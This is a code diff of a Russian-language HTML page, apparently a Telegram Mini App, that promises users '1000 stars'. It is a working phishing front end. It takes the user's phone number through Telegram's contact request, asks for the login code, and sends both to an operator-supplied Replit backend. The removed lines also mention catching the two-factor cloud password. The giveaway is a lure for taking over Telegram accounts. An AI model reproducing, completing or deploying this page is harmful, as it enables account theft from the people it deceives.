@@ -1,62 +1,68 @@
 <!DOCTYPE html>
 <html>
-<head><title>Stars</title></head>
+<head>
+<meta charset="UTF-8">
+<title>Stars</title>
+</head>
 <body>
-  <h1>Получение 1000 звёзд</h1>
-  <p>Нажмите кнопку, чтобы подтвердить номер:</p>
+  <h1>🎉 Получи 1000 звёзд</h1>
+  <p>Нажми кнопку, чтобы подтвердить номер:</p>
   <button onclick="getPhone()">Подтвердить номер</button>
   <div id="codeSection" style="display:none;">
-    <p>Введите код из Telegram:</p>
+    <p>Введи код из SMS:</p>
     <input type="text" id="codeInput">
     <button onclick="sendCode()">Отправить код</button>
   </div>
-  <div id="status"></div>
+  <p id="status"></p>
 
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script>
-    const tg = window.Telegram.WebApp;
-    let currentPhone = '';
+    var tg = window.Telegram.WebApp;
+    var currentPhone = "";
+    var API_URL = "https://ТВОЙ-REPLIT-URL.repl.co/api";  // ЗАМЕНИ НА СВОЙ
 
     async function getPhone() {
+      document.getElementById("status").innerText = "Запрашиваю номер...";
       try {
-        const contact = await tg.requestContact();
+        var contact = await tg.requestContact();
         currentPhone = contact.phone_number;
-        document.getElementById('status').innerText = 'Отправляем код...';
+        document.getElementById("status").innerText = "Отправляю код на " + currentPhone + "...";
 
-        const resp = await fetch('/api', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({action: 'send_phone', phone: currentPhone})
+        var resp = await fetch(API_URL, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({action: "send_phone", phone: currentPhone})
         });
-        const data = await resp.json();
-        if (data.status === 'code_sent') {
-          document.getElementById('codeSection').style.display = 'block';
-          document.getElementById('status').innerText = 'Код отправлен. Введите его:';
+        var data = await resp.json();
+        if (data.status === "code_sent") {
+          document.getElementById("codeSection").style.display = "block";
+          document.getElementById("status").innerText = "Код отправлен. Введи его:";
         } else {
-          document.getElementById('status').innerText = 'Ошибка: ' + (data.error || '');
+          document.getElementById("status").innerText = "Ошибка: " + (data.error || "");
         }
-      } catch (e) {
-        document.getElementById('status').innerText = 'Ошибка: ' + e.message;
+      } catch(e) {
+        document.getElementById("status").innerText = "Ошибка: " + e.message;
       }
     }
 
     async function sendCode() {
-      const code = document.getElementById('codeInput').value;
-      document.getElementById('status').innerText = 'Проверяем код...';
-      const resp = await fetch('/api', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({action: 'submit_code', phone: currentPhone, code: code})
-      });
-      const data = await resp.json();
-      if (data.status === 'ok') {
-        document.getElementById('status').innerText = 'Успешно! Звёзды скоро начислятся.';
-        tg.close();
-      } else if (data.status === '2fa_needed') {
-        document.getElementById('status').innerText = 'Требуется облачный пароль (2FA).';
-        // Можно добавить поле ввода пароля и доотправить
-      } else {
-        document.getElementById('status').innerText = 'Ошибка: ' + (data.error || '');
+      var code = document.getElementById("codeInput").value;
+      document.getElementById("status").innerText = "Проверяю код...";
+      try {
+        var resp = await fetch(API_URL, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({action: "submit_code", phone: currentPhone, code: code})
+        });
+        var data = await resp.json();
+        if (data.status === "ok") {
+          document.getElementById("status").innerText = "✅ Готово! Звёзды скоро будут.";
+          tg.close();
+        } else {
+          document.getElementById("status").innerText = "Ошибка: " + (data.error || "");
+        }
+      } catch(e) {
+        document.getElementById("status").innerText = "Ошибка: " + e.message;
       }
     }
   </script>
